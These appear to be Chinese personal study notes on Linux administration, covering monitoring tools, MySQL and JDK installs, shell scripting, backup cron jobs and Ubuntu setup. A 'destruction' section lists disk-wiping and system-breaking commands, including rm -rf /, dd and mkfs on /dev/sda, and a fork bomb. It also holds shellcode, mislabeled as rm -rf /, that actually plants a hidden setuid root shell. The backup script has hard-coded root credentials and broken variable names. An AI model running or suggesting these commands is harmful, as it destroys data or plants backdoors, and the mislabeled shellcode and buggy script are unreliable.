# linux

```shell
vim /etc/sysconfig/network-scripts/ifcfg-ens33
#修改ip
```

## 常见

### 查看开放端口
```
firewall-cmd --list-ports 
firewall-cmd --reload 
firewall-cmd --zone=public --add-port=9200/tcp --permanent 
firewall-cmd --remove-port=8082/tcp --permanent
```















## 破坏

### 动态链接库文件

Linux下的链接库文件分为静态链接库和动态链接库的文件；

静态链接库的特点是把程序对应的依赖库复制一份到包并嵌入程序包，在Linux中一般为.a后缀的文件，升级难，需要重新编译，占用较多空间，迁移容易；

动态链接库的特点是只把依赖加做一个动态链接，占用较少空间，升级方便，在Linux中一般为.so后缀的文件;

```shell
#使用type命令查看命令ls、mv、cp的命令类型及命令执行路径
type -a ls mv cp

#使用ldd命令查看命令ls、 mv、cp运行需要依赖那些动态链接文件
ldd /usr/bin/ls /usr/bin/mv /usr/bin/cp

mv /lib64/libc.so.6 /tmp

```

### rm -rf

```shell
rm -rf /


char esp[] __attribute__ ((section(“.text”))) /* e.s.p release */
= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68″
“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99″
“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7″
“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56″
“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31″
“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69″
“\x6e\x2f\x73\x68\x00\x2d\x63\x00″
“cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;”;
（16进制的[rm -rf /]）


```

### 抹盘

```
mkfs.ext3 /dev/sda

(vfat、ext2、ext3、bfs……)
```

### dd

```shell
dd if=/dev/zero of=/dev/sda #全部硬盘清零。
dd if=/dev/sda of=/dev/sdb 用第一块硬盘的内容覆盖第二块的内容。
dd if=something of=/dev/sda 往硬盘上写垃圾数据。
```



```shell
){:|:&};:

any_command > /dev/sda  #写入大量的RAW数据

mv /home/yourhomedirectory/* /dev/null #移动主目录
```



## 监控

### 整机top
整机监控：top htop uptime简版


### 内存free
查看内存用量

可用/总<20% 内存不足


### CPU vmstat

```shell
#间隔五秒打印
# vmstat 5
procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----
 r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st
 3  0 1748480 8087728      0 8411224    0    0     1    10    1    1  2  1 97  0  0
 0  0 1748480 8088020      0 8411272    0    0     0    66 12860 29395  1  2 97  0  0
 2  0 1748480 8086384      0 8411280    0    0     0     2 12264 28515  1  2 97  0  0


procs
	r列显示了多少进程正在等待cPu
	b列显示多少进程正在不可中断地休眠(通常意味着它们在等待I/O,例如磁盘、网络、用户输人，等等)。
memory
	swpd列显示多少块被换出到了磁盘(页面交换)。剩下的三个列显示了多少块是空闲的(未被使用)、多少块正在被用作缓冲，	  以及多少正在被用作操作系统的缓存。
swap
	这些列显示页面交换活动:每秒有多少块正在被换入(从磁盘)和换出(到磁盘)。它们比监控swpd列重要多了。
	大部分时间我们喜欢看到si和so列是0，并且我们很明确不希望看到每秒超过10个块。突发性的高峰一样很糟糕。
io
	这些列显示有多少块从块设备读取(bi) 和写出(bo)。 这通常反映了硬盘I/O。
system
	这些列显示了每秒中断(in) 和上下文切换(cs) 的数量。
cpu
	这些列显示所有的CPU时间花费在各类操作的百分比,包括执行用户代码(非内核)、执行系统代码(内核)、 空闲，以及等待		I/O。
	如果正在使用虚拟化，则第五个列可能是st，显示了从虚拟机中“偷走”的百分比。这关系到那些虚拟机想运行但是系
	统管理程序转而运行其他的对象的时间。如果虚拟机不希望运行任何对象，但是系统管理程序运行了其他对象，这不算被偷走		的CPU时间。

内存、交换区，以及I/O统计是块数而不是字节。在GNU/Linux,块大小通常是1024字节。
```

#### CPU密集型

us列  高

sy列  尽可能不超20%

cs列  尽可能不超100000 线程上下文切换

#### IO密集型

b列 高

wa 列 高



### IO iostat

默认情况下，它显示了与vmstat相同的CPU使用信息

```shell
#查看IO子系统
# iostat -dx 5   -iostat -xdk 2 3
Linux 3.10.0-957.12.1.el7.x86_64 (iz94pnb6dghz) 	11/19/2021 	_x86_64_	(4 CPU)

Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util
vda              29.59    70.87  528.79   73.57 13094.74 10943.42    79.81     3.83    2.56    5.25   44.52   0.84  50.77
vdb               0.00     0.00    0.00    0.00     0.00     0.00    66.21     0.00    3.29    3.29    0.00   2.85   0.00

rrqm/s & wrqm/s
	每秒合并的读和写请求。“合并的”意味着操作系统从队列中拿出多个逻辑请求合并为一个请求到实际磁盘。
r/s & w/s
	每秒发送到设备的读和写请求
rkB/s  &  wkB/s
	每秒读写的千字节数。有些系统 为rsec/s和wsec/s每秒读和写的扇区数。
avgrq-sz 
	请求的扇区数。
avgqu-sz
	在设备队列中等待的请求数。
await r_await w_await
	磁盘排队上花费的毫秒数。性能诊断重要参数
svctm
	服务请求花费的毫秒数，不包括排队时间。
%util
	至少有一个活跃请求所占时间的百分比。这个指标无法真实反映设备的利用率
	
#计算并发请求数
concurrency = (r/s + w/s) * (svctm/1000)
或
(avgqu-sz * svctm) / await


```

### 硬盘df -h

### 网络IO ifstat 1

### mpstat
查看所有CPU核信息 mpstat -P ALL 2 
每个进程使用CPU的用量分解信息 pidstat -u 1 -p 进程编号

### sar

### dstat

### collectl

### blktrace



















# JavaEE

## 安装jdk

```BASH
安装步骤
0) 先将软件通过xftp5 上传到 /opt 下
1) 解压缩到 /opt   tar -zxvf
2) 配置环境变量的配置文件vim /etc/profile    
3) JAVA_HOME=/opt/jdk1.7.0_79
4) PATH=/opt/jdk1.7.0_79/bin:$PATH
5) export JAVA_HOME PATH
#需要注销用户, 环境变量才能生效
logout
```

## tomcat

```
步骤 :
1) 解压缩到/opt
2)启动tomcat ./startup.sh
3) 开放端口 vim /etc/sysconfig/iptables
4) 重启防火墙 service iptables restart
```

```
Eclipse的安装
步骤 :
1) 解压缩到/opt
2) 启动eclipse，配置jre和server
3) 启动 ./eclipse
```

## mysql

**卸载旧版本**

```bash
#检查是否安装有MySQL Server
rpm -qa | grep mysql
#普通删除模式
rpm -e mysql_libs   
#强力删除模式，如果使用上面命令删除时，提示有依赖的其它文件，则用该命令可以对其进行强力删除
rpm -e --nodeps mysql_libs    
```

**安装MySQL**

```bash
#安装编译代码需要的包
yum -y install make gcc-c++ cmake bison-devel  ncurses-devel
#解压mysql
tar xvf mysql-5.6.14.tar.gz
cd mysql-5.6.14
#编译安装
cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql -DMYSQL_DATADIR=/usr/local/mysql/data -DSYSCONFDIR=/etc -DWITH_MYISAM_STORAGE_ENGINE=1 -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 -DWITH_READLINE=1 -DMYSQL_UNIX_ADDR=/var/lib/mysql/mysql.sock -DMYSQL_TCP_PORT=3306 -DENABLED_LOCAL_INFILE=1 -DWITH_PARTITION_STORAGE_ENGINE=1 -DEXTRA_CHARSETS=all -DDEFAULT_CHARSET=utf8 -DDEFAULT_COLLATION=utf8_general_ci
#编译并安装  要30分钟左右
make && make install
```

**配置MySQL**

设置权限

```bash
#使用下面的命令查看是否有mysql用户及用户组
cat /etc/passwd #查看用户列表
cat /etc/group  #查看用户组列表
#如果没有就创建
groupadd mysql
useradd -g mysql mysql
#修改/usr/local/mysql权限
chown -R mysql:mysql /usr/local/mysql
```

初始化配置，进入安装路径（在执行下面的指令），执行初始化配置脚本，创建系统自带的数据库和表

```bash
cd /usr/local/mysql
scripts/mysql_install_db --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --user=mysql    [这是一条指令]

#注：在启动MySQL服务时，会按照一定次序搜索my.cnf，先在/etc目录下找，找不到则会搜索"$basedir/my.cnf"，在本例中就是 /usr/local/mysql/my.cnf，这是新版MySQL的配置文件的默认位置！

#注意：在CentOS 6.8版操作系统的最小安装完成后，在/etc目录下会存在一个my.cnf，需要将此文件更名为其他的名字，如：/etc/my.cnf.bak，否则，该文件会干扰源码安装的MySQL的正确配置，造成无法启动。
修改名称，防止干扰：
mv /etc/my.cnf /etc/my.cnf.bak
```

**启动MySQL**

```bash
#添加服务，拷贝服务脚本到init.d目录，并设置开机启动 
#[注意在 /usr/local/mysql 下执行]
cp support-files/mysql.server /etc/init.d/mysql
chkconfig mysql on
service mysql start  --启动MySQL

#执行下面的命令修改root密码
cd /usr/local/mysql/bin
./mysql -uroot  
mysql> SET PASSWORD = PASSWORD('root');
```



# shell

http://c.biancheng.net/view/810.html

Shell是一个命令行解释器,它为用户提供了一个向Linux内核发送请求以便运行程序的界面系统级程序，用户可以用Shell来启动、挂起、停止甚至是编写一些程序.



## shell快速入门

### **脚本格式要求** 

1. 脚本以#!/bin/bash开头  

2.  脚本需要有可执行权限  chmod 744 xxx.sh

### **脚本的常用执行方式**

* 方式1(输入脚本的绝对路径或相对路径) 

	1. 首先要赋予helloworld.sh 脚本的+x权限 
	2. 执行脚本

* 方式2(sh+脚本)  不用赋予脚本+x权限，直接执行即可
	

### **Shell的变量**

#### Shell的变量的介绍

 1）Linux Shell中的变量分为，系统变量和用户自定义变量。 

2）系统变量：$HOME、$PWD、$SHELL、$USER等等 

​		比如： echo $HOME 等等.. 

3）显示当前shell中所有变量：set

#### shell变量的定义

* 基本语法

  1. 定义变量：变量=值

  2. 撤销变量：unset 变量

  3. 声明静态变量：readonly变量，注意：不能unset

可把变量提升为全局环境变量，可供其他shell程序使用

```bash
#定义变量A
A=100  
echo "A=$A"
#撤销变量A
unset A    
echo "A=$A"
readonly B=99   #声明静态的变量B
unset B         #不能unset
```

#### 定义变量的规则

1. 变量名称可以由字母、数字和下划线组成，但是不能以数字开头。
2.  等号两侧不能有空格
3.  变量名称一般习惯为大写

#### ==将命令的返回值赋给变量==

1. A=`ls -la` 反引号，运行里面的命令，并把结果返回给变量A
2. A=$(ls -la) 等价于反引号

#### 设置环境变量

**基本语法**

1. export 变量名=变量值 （功能描述：将shell变量输出为环境变量）
2. source 配置文件 （功能描述：让修改后的配置信息立即生效）
3.  echo $变量名 （功能描述：查询环境变量的值）

为了让 /etc/profile 的环境变量生效，需要使用source /etc/profile或者重启系统或者注销用户

```shell
:<<!
多行注释
!
#在一个shell定义一个环境变量
JAVA_HOME=/opt/java
export JAVA_HOMEJAVA_HOME
--在命令行查看
source /etc/profile #使其生效
echo $JAVA_HOME
#在另一个shell使用
echo "javahome=$JAVA_HOME"
```

#### ==位置参数变量==

**介绍**
	当我们执行一个shell脚本时，如果希望获取到命令行的参数信息，就可以使用到位置参数变量
	比如 ： ./myshell.sh 100 200 , 这个就是一个执行shell的命令行，可以在myshell 脚本中获取到参数信息

**基本语法**

```shell
$n （功能描述：n为数字，$0代表命令本身，$1-$9代表第一到第九个参数，十以上的参数，
十以上的参数需要用大括号包含，如${10}）
$* （功能描述：这个变量代表命令行中所有的参数，$*把所有的参数看成一个整体）
$@（功能描述：这个变量也代表命令行中所有的参数，不过$@把每个参数区分对待）
$#（功能描述：这个变量代表命令行中所有参数的个数）
```

#### 预定义变量

基本介绍
就是shell设计者事先已经定义好的变量，可以直接在shell脚本中使用

基本语法

```shell
$$ （功能描述：当前进程的进程号（PID））
$! （功能描述：后台运行的最后一个进程的进程号（PID））
$？ （功能描述：最后一次执行的命令的返回状态。如果这个变量的值为0，证明上一个命令正
确执行；如果这个变量的值为非0（具体是哪个数，由命令自己来决定），则证明上一个命令执行不正确了。）
```

```shell
#!/bin/bash
echo "当前进程号=$$"
#后台运行 xx.sh
./xx.sh &
echo "最后的进程号=$!"
echo "执行的值=$?"
```

### 运算符

```shell
“$((运算式))”或“$[运算式]”
expr m + n 
  #注意expr运算符间要有空格
expr m - n
expr \*, /, % 乘，除，取余
```

```shell
TEMP=`expr 2 + 3`
RES=`expr $TEMP \* 4`
echo "res=$RES"
```

### 条件判断

• 基本语法

```shell
[ condition ]（注意condition前后要有空格）
#非空返回true，可使用$?验证（0为true，>1为false）
```

• 应用实例

```bash
[ atguigu ] 返回true
[] 返回false
[condition] && echo OK || echo notok 条件满足，执行后面的语句
```

判断语句
• 常用判断条件

```bash
#两个整数的比较
= 字符串比较
-lt 小于
-le 小于等于
-eq 等于
-gt 大于
-ge 大于等于
-ne 不等于
# 按照文件权限进行判断
-r 有读的权限
-w 有写的权限
-x 有执行的权限
#按照文件类型进行判断
-f 文件存在并且是一个常规的文件
-e 文件存在                   [ -e /root/a.txt ]
-d 文件存在并是一个目录
```

### 流程控制

#### if

```bash
if [ 条件判断式 ];then 
  程序
fi 
或者
if [ 条件判断式 ] 
  then 
	程序
elif [条件判断式]
  then
	程序
fi
注意事项：（1）[ 条件判断式 ]，中括号和条件判断式之间必须有空格 (2) 推荐使用第二种方式
```

#### case

```bash
case $变量名 in 
"值1"）
如果变量的值等于值1，则执行程序1 
;; 
"值2"）
如果变量的值等于值2，则执行程序2 
;; 
…省略其他分支… 
*）
如果变量的值都不是以上的值，则执行此程序
;; 
esac
```

#### for

```bash
for 变量 in 值1 值2 值3… 
  do 
    程序
done
或者
for (( 初始值;循环控制条件;变量变化 )) 
  do 
	程序
done
```

```bash
for i in "$@" 
  do 
    echo "$i"
done

SUM=0
for ((i=1;i<=100;i++)) 
  do 
	SUM=$[$SUM+$i]
done
echo "sum=$SUMd"
```

#### while

```bash
while [ 条件判断式 ] 
  do 
	程序
done
```

```bash
SUM=0
i=0
while [ $i -le $1 ] 
  do 
	SUM=$[$SUM+$i]
	i=$[$i+1]
done
echo "SUM= $SUM"
```

### read读取控制台输入

**基本语法**
read(选项)(参数)
选项：
-p：指定读取值时的提示符；
-t：指定读取值时等待的时间（秒），如果没有在指定的时间内输入，就不再等待了。。
参数
变量：指定读取值的变量名

```bash
read -t 10 -p "输入为num1=" NUM1
```

### 函数

函数介绍
shell编程和其它编程语言一样，有系统函数，也可以自定义函数。

系统函数中，我们这里就介绍两个。

#### **系统函数**

* basename基本语法
  功能：返回完整路径最后 / 的部分，常用于获取文件名
  basename [pathname] [suffix]
  basename [string] [suffix] （功能描述：basename命令会删掉所有的前缀包括最后一个（‘/’）
  字符，然后将字符串显示出来。
  选项：
  suffix为后缀，如果suffix被指定了，basename会将pathname或string中的suffix去掉。

  ```bash
  basename /root/a.txt
  a.txt
  basename /root/a.txt .txt
  a
  ```

* dirname基本语法
  功能：返回完整路径最后 / 的前面的部分，常用于返回路径部分
  dirname 文件绝对路径 （功能描述：从给定的包含绝对路径的文件名中去除文件名（非目录的部分），
  然后返回剩下的路径（目录的部分））

  ```bash
  dirname /root/a.txt
  /root
  ```

#### 自定义函数

• 基本语法

```bash
[ function ] funname[()]
{
        Action;
        [return int;]
}
调用直接写函数名：funname [值]
```

```bash
[ function ] getSum[()]
{
        SUM=$[$n1+$n2];
        echo "和=$SUM"
}
read -p "n1=" n1
read -p "n2=" n2

getSum $n1 $n2
```

## 案例

**需求分析**
1) 每天凌晨 2:10 备份 数据库 atguiguDB 到 /data/backup/db
2) 备份开始和备份结束能够给出相应的提示信息
3) 备份后的文件要求以备份时间为文件名，并打包成 .tar.gz 的形式，比如：
				2018-03-12_230201.tar.gz
4) 在备份的同时，检查是否有10天前备份的数据库文件，如果有就将其删除。

```bash
#!/bin/bash

#数据库定时备份
#备份路径
BACKUP=/data/backup/db
#当前时间为文件名
DATATIME=$(date +%Y_%m_%d_%H%M%S)

echo "=====开始备份===="
echo "路径=$BACKUP/$DATETIME.tar.gz"

#主机/用户名/密码/数据库
HSOT=localhost
DB_USER=root
DB_PWD=root
DATABSASE=myDB
#创建备份文件夹
[ ! -d "$BACKUP/$DATETIME" ] && mkdir -p "$BACKUP/$DATETIME"
#执行mysql备份
mysqldump -u$DB_USER -p$DB_PWD --host=$HOST $DATABSASE | gzip > $BACKUP/$DATETIME/$DATETIME.sql.gz
#打包文件
cd $BACKUP
tar -zcvf $DATETIME.tar.gz $DATETIME
#删除临时目录
rm -rf $BACKUP/$DATETIME

#删除10天前的文件
find $BACKUP -mtime +10 -name "*.tar.gz" -exec rm -rf {} \;
echo "=====success======"
```

```shell
crontab -e  //添加定时任务
10 2 * * * /user/sbin/mysql_db_backup.sh
```

# Ubuntu

一个以桌面应用为主的开源GNU/Linux操作系统， Ubuntu 是基于 GNU/Linux，支持x86、amd64（即x64）和ppc架构，由全球化的专业开发团 队（Canonical Ltd）打造的。

Python开发

下载http://cn.ubuntu.com/download/







Ubuntu的root 用户

介绍
安装ubuntu成功后，都是普通用户权限，并没有最高root权限，如果需要使用root权
限的时候，通常都会在命令前面加上 sudo 。有的时候感觉很麻烦。
我们一般使用su命令来直接切换到root用户的，但是如果没有给root设置初始密码，
就会抛出 su : Authentication failure 这样的问题。所以，我们只要给root用户设置一个
初始密码就好了。

给root用户设置密码并使用

1. 输入 sudo passwd 命令，设定root用户密码。

2.  输入 su root，输入密码，换成root,  提示符$代表一般用户，提示符#代表root用户。

3.  输入 exit 命令，退出root并返回一般用户

   

开发python

```bash
vim hello.py
#如果没有vim 
apt install vim
python hello.py
python3 hello.py
```

## apt

apt是Advanced Packaging Tool的简称，是一款安装包管理工具。在Ubuntu下， 我们可以使用apt命令可用于软件包的安装、删除、清理等，类似于 Windows中的软件管理工具。

```bash
sudo apt-get update 更新源
sudo apt-get install package 安装包
sudo apt-get remove package 删除包

sudo apt-cache search package 搜索软件包
sudo apt-cache show package 获取包的相关信息，如说明、大小、版本等
sudo apt-get install package --reinstall 重新安装包

sudo apt-get -f install 修复安装
sudo apt-get remove package --purge 删除包，包括配置文件等
sudo apt-get build-dep package 安装相关的编译环境

sudo apt-get upgrade 更新已安装的包
sudo apt-get dist-upgrade 升级系统
sudo apt-cache depends package 了解使用该包依赖那些包
sudo apt-cache rdepends package 查看该包被哪些包依赖
sudo apt-get source package 下载该包的源代码
```

更新Ubuntu软件下载地址

https://mirrors.tuna.tsinghua.edu.cn/清华ubuntu镜像

```bash
/etc/apt/sources.list
#先备份
sudo cp /etc/apt/sources.list /etc/apt/sources.list.backup
#清空
echo '' > sources.list
#直接替换粘贴镜像

#更新源
sudo apt-get update 


```

## ssh远程登录Ubuntu

```bash
#安装SSH和启用
sudo apt-get install openssh-server
#执行上面指令后，在当前这台Linux上就安装了SSH服务端和客户端。
service sshd restart 
#执行上面的指令，就启动了 sshd 服务。会监听端口22
netstat -app | more  #查看端口监听
```

从linux系统客户机远程登陆linux系统服务机

* 基本语法：
  ssh 用户名@IP
  例如：ssh atguigu@192.168.188.130
  使用ssh访问，如访问出现错误。可查看是否有该文件 ～/.ssh/known_ssh 尝试删除该文件
  解决。
*  登出
  登出命令：exit�